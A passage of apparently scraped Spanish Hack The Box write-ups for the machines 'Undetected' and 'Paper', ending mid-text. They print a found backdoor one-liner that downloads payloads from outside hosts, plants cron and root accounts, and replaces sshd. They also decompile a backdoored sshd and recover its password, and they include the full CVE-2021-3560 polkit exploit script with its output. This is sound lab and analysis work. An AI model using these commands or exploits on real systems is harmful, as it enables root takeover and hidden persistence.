\u0026gt;\u0026gt; /etc/passwd; done \u0026lt; users.txt; rm users.txt;  Se trata de un comando de consola en un \u0026ldquo;one-liner\u0026rdquo; . Si lo formateamos, tenemos lo siguiente:\nwget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys wget tempfiles.xyz/.main -O /var/lib/.main chmod 755 /var/lib/.main echo \"* 3 * * * root /var/lib/.main\" \u0026gt;\u0026gt; /etc/crontab awk -F\":\" '$7 == \"/bin/bash\" \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u0026gt;\u0026gt; /etc/shadow\")}' /etc/passwd awk -F\":\" '$7 == \"/bin/bash\" \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" \u0026gt; users.txt\")}' /etc/passwd while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" \u0026gt;\u0026gt; /etc/passwd done \u0026lt; users.txt rm users.txt  Primero, se descarga un archivo llamado .main, lo guarda en var/lib/.main y lo configura para que se ejecute cada minuto entre las 03:00 y las 03:59 (es lo que * 3 * * * significa, se puede comprobar en crontab.cronhub.io). Aunque /etc/crontab tiene esta configuración:\nwww-data@production:/$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) # * 3 * * * root /var/lib/.main  El archivo /var/lib/.main no existe:\nsteven@production:~$ ls -l /var/lib/.main ls: cannot access '/var/lib/.main': No such file or directory  Movimiento lateral a steven Por tanto, vamos a seguir analizando el \u0026ldquo;one-liner\u0026rdquo;. Luego, añade el hash de una contraseña en /etc/passwd, poniendo como nombre de usuario \u0026quot;$user\u0026quot;1. Esta claro que se refiere a steven1. Vamos a romper este hash con john:\n$ echo \"steven1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::\" \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status ihatehackers (steven1) 1g 0:00:01:32 DONE 0.01078g/s 961.2p/s 961.2c/s 961.2C/s iloveyoudaddy..halo03 Use the \"--show\" option to display all of the cracked passwords reliably Session completed.  Con esta contraseña, podemos acceder como steven1 por SSH:\n$ ssh steven1@10.10.11.146 steven1@10.10.11.146's password: steven@production:~$ id uid=1000(steven) gid=1000(steven) groups=1000(steven) steven@production:~$ cat user.txt 61bbcee605d3d4f5a4deef36b75c8126  Sorprendentemente, somos steven (no steven1). Esto ocurre porque ambos usuarios tienen el mismo ID de usuario. Ahora que tenemos la flag user.txt, vamos a seguir enumerando.\nEnumeración del servicio Apache Este usuario tiene un correo en /var/mail/steven:\nsteven@production:~$ find / -user steven 2\u0026gt;/dev/null | grep -vE 'proc|sys|run' /dev/pts/0 /var/mail/steven /home/steven /home/steven/.cache /home/steven/.cache/motd.legal-displayed /home/steven/.bashrc /home/steven/user.txt /home/steven/.profile /home/steven/.local /home/steven/.local/share /home/steven/.local/share/nano /home/steven/.ssh /home/steven/.bash_logout /home/steven/.bash_history steven@production:~$ cat /var/mail/steven From root@production Sun, 25 Jul 2021 10:31:12 GMT Return-Path: \u0026lt;root@production\u0026gt; Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for \u0026lt;steven@production\u0026gt;; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: \u0026lt;202107251031.80FAcdZ171847@production\u0026gt; To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behavior with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin  Dice que el servicio Apache está raro. A lo mejor el binario /var/backups/info tiene algo que ver. Vamos a coger la fecha de la última modificación de este archivo:\nsteven@production:~$ ls -l /var/backups/info -r-x------ 1 www-data www-data 27296 May 14 2021 /var/backups/info  Y ahora podemos buscar archivos de Apache alrededor de esta fecha, a lo mejor la hipótesis es cierta y el servidor está comprometido:\nsteven@production:~$ find / -newermt '2021-05-10' ! -newermt '2021-05-20' 2\u0026gt;/dev/null | grep apache /usr/lib/apache2/modules/mod_reader.so /etc/apache2/mods-available/reader.load /etc/apache2/mods-enabled/reader.load  Siguiendo estos archivos, llegamos a otro binario ELF de 64 bits:\nsteven@production:~$ file /etc/apache2/mods-enabled/reader.load /etc/apache2/mods-enabled/reader.load: symbolic link to ../mods-available/reader.load steven@production:~$ file /etc/apache2/mods-available/reader.load /etc/apache2/mods-available/reader.load: ASCII text steven@production:~$ cat /etc/apache2/mods-enabled/reader.load LoadModule reader_module /usr/lib/apache2/modules/mod_reader.so steven@production:~$ file /usr/lib/apache2/modules/mod_reader.so /usr/lib/apache2/modules/mod_reader.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=e26fdc45e4b6561d29af8306c2be74f35ab140bb, with debug_info, not stripped  Esto es un módulo cargado en Apache (a lo mejor es una puerta trasera). De nuevo lo transferimos a nuestra con nc:\nsteven@production:~$ nc 10.10.14.62 4444 \u0026lt; /usr/lib/apache2/modules/mod_reader.so ^C steven@production:~$ md5sum /usr/lib/apache2/modules/mod_reader.so 5ef63371b6a138253a87aa1f79abf199 /usr/lib/apache2/modules/mod_reader.so  $ nc -nlvp 4444 \u0026gt; mod_reader.so Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:44820. $ md5sum mod_reader.so 5ef63371b6a138253a87aa1f79abf199 mod_reader.so  De nuevo, con strings aparece una cadena de texto larga. Esta vez parece que está codificada en Base64 porque solamente hay números y letras (tanto minúsculas como mayúsculas):\n$ strings -120 mod_reader.so d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk $ strings -120 mod_reader.so | base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd  Y hay otro \u0026ldquo;one-liner\u0026rdquo;, pero más simple:\nwget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd  Esta vez, se está descargando un archivo llamado image.jpeg y sobrescribe /usr/sbin/sshd (evidentemente, no es una imagen JPEG). Después, modifica la fecha de /usr/sbin/sshd para pasar desapercibido.\nGenial, vamos a transferir /usr/sbin/sshd a nuestra máquina para analizarlo:\nsteven@production:~$ nc 10.10.14.62 4444 \u0026lt; /usr/sbin/sshd ^C steven@production:~$ md5sum /usr/sbin/sshd 9ae629656c6f72dc957358b1f41df27e /usr/sbin/sshd  $ nc -nlvp 4444  sshd Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:44820. ^C $ md5sum sshd 9ae629656c6f72dc957358b1f41df27e sshd  Analizando sshd (ingeniería inversa) Podemos abrir el archivo en Ghidra y mirar sus funciones. Como se trata de un programa que corre como demonio o daemon (de ahí la d de sshd), el programa exporta funciones que serán usadas por otros programas como ssh.\nPor tanto, tenemos que mirar en las funciones exportadas. Una de ellas es auth_password, la cual huele bastante porque hay una variable llamada backdoor (el binario mantiene los nombres de los símbolos en este caso):\nint auth_password(ssh *ssh, char *password) { Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; size_t sVar6; byte bVar7; int iVar8; long in_FS_OFFSET; char backdoor[31]; byte local_39[9]; long local_30; bVar7 = 0xd6; ctxt = (Authctxt *) ssh-\u0026gt;authctxt; local_30 = *(long *) (in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u0026gt;pw; iVar8 = ctxt-\u0026gt;valid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *) backdoor; while(true) { pbVar5 = pbVar4 + 1; *pbVar4 = bVar7 ^ 0x96; if (pbVar5 == local_39) break; bVar7 = *pbVar5; pbVar4 = pbVar5; } iVar2 = strcmp(password, backdoor); uVar3 = 1; if (iVar2 != 0) { sVar6 = strlen(password); uVar3 = 0; if (sVar6 \u0026lt; 0x401) { if ((ppVar1-\u0026gt;pw_uid == 0) \u0026amp;\u0026amp; (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != '\\0') || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-\u0026gt;force_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh, password); if (ctxt-\u0026gt;force_pwchange != 0) { auth_restrict_session(ssh); } uVar3 = (uint) (iVar2 != 0 \u0026amp;\u0026amp; iVar8 != 0); } } } if (local_30 == *(long *) (in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); }  Aunque Ghidra hace algo raro con backdoor, podemos deducir que es una cadena de caracteres (char[31]). Podemos juntar todas las piezas para construir la string, teniendo en cuenta que _0_4_ significa índice 0 y 4 bytes de longitud. Además, los números en hexadecimales tienen que ser formateados en little-endian para transformarlos a bytes.\nHay un número -0x5b que tiene que ponerse en positivo porque tiene que ser un código ASCII válido (entre 0 y 255), es decir entre 0x00 y 0xff. Tenemos que calcular el complemento a dos, que es lo mismo que negar el número (en positivo) y sumar 1: ~(0x5b) + 1 = 0xa4 + 1 = 0xa5.\nPodemos usar funciones de empaquetado de pwntools para empaquetar los números en función del tamaño del número (esto es, p64, p32, p16 or p8).\nVemos una instrucción strcmp(password, backdoor) que parece que compara la contraseña proporcionada en ssh con la variable backdoor en la que estamos trabajando. Sin embargo, antes de realizar la comparación, existe una operación criptográfica sobre backdoor.\nEl bucle while está realizando una operación XOR sobre cada carácter de backdoor con 0x96 como clave. Para descifrar el cifrado XOR, se debe realizar otra operación XOR entre el texto cifrado y la misma clave usada para cifrar, o sea 0x96.\nEscalada de privilegios Y ya tenemos todo para obtener la contraseña esperada. Podemos usar Python y pwntools para obtener la contraseña:\n$ python -q \u0026gt;\u0026gt;\u0026gt; from pwn import p8, p16, p32, p64 \u0026gt;\u0026gt;\u0026gt; backdoor = p32(0xf0e7abd6) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xa4b3a3f3) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xf7bbfdc8) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xfdb3d6e7) \u0026gt;\u0026gt;\u0026gt; backdoor += p64(0xb2d6f4a0fda0b3d6) \u0026gt;\u0026gt;\u0026gt; backdoor += p32(0xbcf0b5e3) \u0026gt;\u0026gt;\u0026gt; backdoor += p16(0xa9f4) \u0026gt;\u0026gt;\u0026gt; backdoor += p8(0xa5) \u0026gt;\u0026gt;\u0026gt; ''.join(map(lambda b: chr(b ^ 0x96), backdoor)) '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3'  Aunque no tiene significado la contraseña, si la usamos para el usuario root, podremos acceder por SSH. Además, podemos confirmar que la máquina estaba ya comprometida porque los cibercriminales tenían acceso como root por SSH:\n$ ssh root@10.10.11.146 root@10.10.11.146's password: root@production:~# cat root.txt 3afbb2e3f9d6f2329f00f41711a94cd8  ","image":"/images/HTB/Undetected/Undetected.png","permalink":"https://7rocky.github.io/htb/undetected/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una página web en PHP con una dependencia de terceros vulnerable a RCE. La máquina ha sido previamente comprometida y tiene algunas puertas traseras y exploits que tienen que ser detectadas y analizadas mediante técnicas de ingeniería inversa","time":10,"title":"Undetected"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.143   Fecha: 05 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.143 -p 22,80,443 Nmap scan report for paper.htb (10.10.11.143) Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-title: HTTP Server Test Page powered by CentOS |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) | http-methods: |_ Potentially risky methods: TRACE |_http-title: HTTP Server Test Page powered by CentOS |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 35.70 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).\nEnumeración Si vamos a http://10.10.11.143, veremos una página de Apache por defecto en CentOS:\nNo hay nada útil aquí excepto una cabecera de respuesta llamada X-Backend-Server que muestra un dominio:\n$ curl -I 10.10.11.143 HTTP/1.1 403 Forbidden Date: Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 X-Backend-Server: office.paper Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT ETag: \"30c0b-5c5c7fdeec240\" Accept-Ranges: bytes Content-Length: 199691 Content-Type: text/html; charset=UTF-8  Vamos a continuar enumerando subdominios:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.143/ -H 'Host: FUZZ.office.paper' -fc 403 chat [Status: 200, Size: 223163, Words: 13014, Lines: 508]  Ahora podemos añadir estos subdominios a /etc/hosts. Si vamos a http://chat.office.paper, veremos una aplicación de Rocket.chat, pero necesitamos una URL de registro para poder crear una cuenta:\nEnumeración de Wordpress Si vamos a http://office.paper, veremos una página de Wordpress:\nEl último artículo contiene un comentario diciendo que podría haber información secreta en los borradores:\nPodemos enumerar la versión de Wordpress de varias maneras. Por ejemplo:\n$ curl -s office.paper | grep generator \u0026lt;meta name=\"generator\" content=\"Wordpress 5.2.3\" /\u0026gt;  Ahora podemos buscar vulnerabilidades que apliquen a esta versión:\n$ searchsploit Wordpress 5.2.3 ------------------------------------------------------------------------- ---------------------------- Exploit Title | Path ------------------------------------------------------------------------- ---------------------------- Wordpress Core 5.2.3 - Cross-Site Host Modification | php/webapps/47361.pl Wordpress Core 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md Wordpress Core Wordpress Plugin DZS Videogallery Wordpress Plugin iThemes Security Wordpress Plugin Rest Google Maps  El archivo solamente dice que pongamos ?static=1 para ver el contenido de borrador:\nSo far we know that adding `?static=1` to a Wordpress URL should leak its secret content Here are a few ways to manipulate the returned entries: - `order` with `asc` or `desc` - `orderby` - `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1\u0026amp;order=asc` will show the secret content.  Acceso a la máquina Vamos a probarlo:\nGenial, tenemos el enlace de registro para Rocket.chat:\nChateando con un bot Después de registrar una nueva cuenta, entramos a un chat general:\nExiste un bot llamado recyclops que nos permite listar directorios y leer archivos del servidor:\nPodemos probar a inyectar comandos pero no funciona. En su lugar, podemos listar algunos directorios hasta descubrir que el bot está desarrollado con hubot:\nNótese que se utiliza .. para listar el directorio anterior.\nSi buscamos información sobre Rocket.chat y hubot, llegaremos a esto: developer.rocket.chat. Como se explica aquí, el bot necesita un archivo .env con algunas variables de entorno, y una de ellas es la contraseña del usuario del bot. Ahora podemos leer este archivo:\nY conseguimos una contraseña potencial: Queenofblad3s!23.\nReutilización de contraseñas Ahora podemos probar a reutilizar la contraseña en SSH para los usuarios hubot y dwight. La contraseña funciona con dwight:\n$ ssh hubot@office.paper hubot@office.paper's password: Permission denied, please try again. $ ssh dwight@office.paper dwight@office.paper's password: [dwight@paper ~]$ cat user.txt 1c16f7c5b0aa6e8aaa242fe98cfbc2cc  En este punto, ya podemos leer la flag user.txt.\nEscalada de privilegios Existe un script llamado pk.sh en el directorio personal:\n[dwight@paper ~]$ ls -la total 36 drwx------ 11 dwight dwight 294 Feb 5 17:49 . drwxr-xr-x. 3 root root 20 Jan 14 06:50 .. lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history - /dev/null -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc drwx------ 5 dwight dwight 56 Jul 3 2021 .config -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg -rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history drwx------ 3 dwight dwight 19 Jul 3 2021 .local drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim -rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot -rwxrwxr-x 1 dwight dwight 2812 Jan 14 06:48 pk.sh drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales -r-------- 1 dwight dwight 33 Feb 5 17:49 user.txt  #!/bin/bash # Set the name and display name userName=\"hacked\" realName=\"hacked\" # Set the account as an administrator accountType=1 # Set the password hash for 'password' and password hint password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB' passHint=\"password\" # Check Polkit version polkitVersion=$(systemctl status polkit.service | grep version | cut -d \" \" -f 9) if [[ \"$(apt list --installed 2\u0026gt;/dev/null | grep polkit | grep -c 0.105-26)\" -ge 1 || \"$(yum list installed | grep polkit | grep -c 0.117-2)\" ]]; then echo \"[*] Vulnerable version of polkit found\" else echo \"[!] WARNING: Version of polkit might not vulnerable\" fi # Validate user is running in SSH instead of desktop terminal if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then echo \"[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts\" exit fi # Test the dbus-send timing to load into exploit echo \"[*] Determining dbus-send timing\" realTime=$( TIMEFORMAT=\"%R\" { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType; } 2\u0026gt;\u0026amp;1 | cut -d \" \" -f6 ) halfTime=$(echo \"scale=3;$realTime/2\" | bc) # Check for user first in case previous run of script failed on password set if id \"$userName\" \u0026amp;\u0026gt;/dev/null; then userid=$(id -u $userName) echo \"[*] New user $userName already exists with uid of $userid\" else userid=\"\" echo \"[*] Attempting to create account\" while [[ $userid == \"\" ]]; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2\u0026gt;/dev/null \u0026amp; sleep $halfTime kill $! 2\u0026gt;/dev/null if id \"$userName\" \u0026amp;\u0026gt;/dev/null; then userid=$(id -u $userName) echo \"[*] New user $userName created with uid of $userid\" fi done fi # Add the password to /etc/shadow # Sleep added to ensure there is enough of a delay between timestamp checks echo \"[*] Adding password to /etc/shadow and enabling user\" sleep 1 currentTimestamp=$(stat -c %Z /etc/shadow) fileChanged=\"n\" while [ $fileChanged == \"n\" ]; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2\u0026gt;/dev/null \u0026amp; sleep $halfTime kill $! 2\u0026gt;/dev/null if [ $(stat -c %Z /etc/shadow) -ne $currentTimestamp ]; then fileChanged=\"y\" echo \"[*] Exploit complete!\" fi done echo \"\" echo \"[*] Run 'su - $userName', followed by 'sudo su' to gain root access\"  Este es un script que explota una vulnerabilidad de PolKit, CVE-2021-3560.\nSi ejecutamos el exploit, un nuevo usuario llamado hacked será creado (contraseña: password) con permisos de sudo para escalar a root:\n[dwight@paper ~]$ ./pk.sh Failed to set locale, defaulting to C.UTF-8 Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \"failovermethod\" does not exist Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \"failovermethod\" does not exist Modular dependency problems: Problem 1: conflicting requests - nothing provides module(perl:5.26) needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64 Problem 2: conflicting requests - nothing provides module(perl:5.26) needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64 [*] Vulnerable version of polkit found [*] Determining dbus-send timing [*] Attempting to create account ./pk.sh: line 48: 68220 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68226 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68234 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68241 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68248 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68255 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68262 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68269 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68277 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null ./pk.sh: line 48: 68281 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2 /dev/null [*] New user hacked created with uid of 1005 [*] Adding password to /etc/shadow and enabling user ./pk.sh: line 63: 68293 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2 /dev/null [*] Exploit complete! [*] Run 'su - hacked', followed by 'sudo su' to gain root access [dwight@paper ~]$ su hacked Password: [hacked@paper dwight]$ sudo su [sudo] password for hacked: We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [root@paper dwight]# cat /root/root.txt 6ca0add99568e6f2866e5a006c815866  Aunque la presencia de este exploit en la máquina no era intencionado, la máquina sigue siendo vulnerable a PwnKit después de la corrección. Podemos utilizar poc.sh para explorarlo (de hecho, el enlace pertenece a secnigma, el creador de la máquina):\n[dwight@paper ~]$ ./poc.sh -u=rocky -p=rocky [!] Username set as : rocky [!] No Custom Timing specified. [!] Timing will be detected Automatically [!] Force flag not set. [!] Vulnerability checking is ENABLED! [!] Starting Vulnerability Checks... [!] Checking distribution... [!] Detected Linux distribution as \"centos\" [!] Checking if Accountsservice and Gnome-Control-Center is installed [+] Accounts service and Gnome-Control-Center Installation Found!! [!] Checking if polkit version is vulnerable [+] Polkit version appears to be vulnerable!! [!] Starting exploit... [!] Inserting Username rocky... Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required [+] Inserted Username rocky with UID 1005! [!] Inserting password hash... [!] It looks like the password insertion was succesful! [!] Try to login as the injected user using sudo - rocky [!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again. [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell! [dwight@paper ~]$ su rocky Password: su: Authentication failure  Es posible que falle algunas veces, pero el usuario se crea:\n[dwight@paper ~]$ cat /etc/passwd | grep rocky rocky:x:1005:1005:rocky:/home/rocky:/bin/bash  Por tanto, tenemos que ejecutarlo varias veces hasta que podamos acceder correctamente:\n[dwight@paper ~]$ ./poc.sh -u=rocky -p=rocky [!] Username set as : rocky [!] No Custom Timing specified. [!] Timing will be detected Automatically [!] Force flag not set. [!] Vulnerability checking is ENABLED! [!] Starting Vulnerability Checks... [!] Checking distribution... [!] Detected Linux distribution as \"centos\" [!] Checking if Accountsservice and Gnome-Control-Center is installed [+] Accounts service and Gnome-Control-Center Installation Found!! [!] Checking if polkit version is vulnerable [+] Polkit version appears to be vulnerable!! [!] Starting exploit... [!] Inserting Username rocky... Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required [+] Inserted Username rocky with UID 1005! [!] Inserting password hash... [!] It looks like the password insertion was succesful! [!] Try to login as the injected user using sudo - rocky [!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again. [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell! [dwight@paper ~]$ su rocky Password: [rocky@paper dwight]$  Ahora tenemos permisos de sudo, por lo que podemos escalar a root:\n[rocky@paper dwight]$ sudo bash We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for rocky: [root@paper dwight]# cat /root/root.txt 6ca0add99568e6f2866e5a006c815866  ","image":"/images/HTB/Paper/Paper.png","permalink":"https://7rocky.github.io/htb/paper/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene una página web en Wordpress con información secreta en borradores, y también un chat con un bot que 